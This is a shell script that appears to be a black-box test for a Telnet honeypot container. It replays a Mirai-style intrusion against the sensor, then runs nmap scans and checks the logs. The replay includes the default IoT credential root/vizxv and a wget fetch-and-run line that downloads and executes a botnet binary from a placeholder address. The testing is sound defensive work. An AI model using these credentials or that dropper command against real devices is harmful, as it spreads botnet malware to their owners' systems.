#!/bin/sh
# Black-box check with real Telnet clients and nmap against the built container.
# Usage (repo root):  sg docker -c "sh sensors/telnet/tests/blackbox.sh"
# Needs docker and network access to pull alpine and instrumentisto/nmap. Redis is unreachable on
# purpose: the publisher must drop events without affecting the session.
set -eu
cd "$(dirname "$0")/../../.."
NET=sp-telnet-bb; NAME=sp-telnet-bb; IMG=sp-telnet-bb:dev
cleanup() { docker rm -f "$NAME" >/dev/null 2>&1 || true; docker network rm "$NET" >/dev/null 2>&1 || true; docker volume rm "$NAME-data" >/dev/null 2>&1 || true; rm -f /tmp/sp-tn-client.sh; }
trap cleanup EXIT; cleanup
docker build -q -f sensors/telnet/Dockerfile -t "$IMG" . >/dev/null
docker network create "$NET" >/dev/null
docker run -d --name "$NAME" --network "$NET" --read-only --tmpfs /tmp --cap-drop ALL \
  --security-opt no-new-privileges:true --memory 256m --cpus 0.5 --pids-limit 128 \
  -v "$NAME-data:/data" -e REDIS_HOST=redis.invalid "$IMG" >/dev/null
for _ in $(seq 1 30); do
  [ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] && break
  sleep 2
done
[ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] || { echo "not healthy"; exit 1; }
echo HEALTHY
cat > /tmp/sp-tn-client.sh <<'INNER'
apk add -q busybox-extras inetutils-telnet expect >/dev/null 2>&1
echo "--- busybox telnet, Mirai-style script"
( sleep 1; printf 'root\n'; sleep 1; printf 'vizxv\n'; sleep 1
  for c in enable system shell sh '/bin/busybox ECCHI' 'cat /proc/mounts' 'uname -a' \
    'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /' \
    '>.t && cat .t && echo writable' \
    "wget http://198.51.100.7/x.arm -O dvrHelper; chmod 777 dvrHelper; ./dvrHelper" exit; do
    printf '%s\n' "$c"; sleep 0.4; done ) | busybox-extras telnet sp-telnet-bb 2323 2>&1 | tr -d '\r'
echo "--- inetutils telnet (negotiates NAWS/TTYPE) via expect"
expect -c '
  set timeout 10
  spawn telnet sp-telnet-bb 2323
  expect "login: "; send "admin\r"
  expect "Password: "; send "admin\r"
  expect " $ "; send "id; ps | head -3\r"
  expect " $ "; send "exit\r"
  expect eof' 2>&1 | tr -d '\r'
INNER
docker run --rm --network "$NET" -v /tmp/sp-tn-client.sh:/c.sh:ro alpine:3.20 sh /c.sh
echo "--- nmap -sV"
docker run --rm --network "$NET" instrumentisto/nmap -sV -p 2323 "$NAME" | grep -E "^2323|Service Info|telnet"
docker run --rm --network "$NET" instrumentisto/nmap -p 2323 --script telnet-encryption,telnet-ntlm-info "$NAME" | grep -E "^2323|\|"
docker logs "$NAME" 2>&1 | head -5
docker logs "$NAME" 2>&1 | grep -ci "honeypot\|suckerpot" | sed "s/^/giveaway_lines_in_logs=/" || true
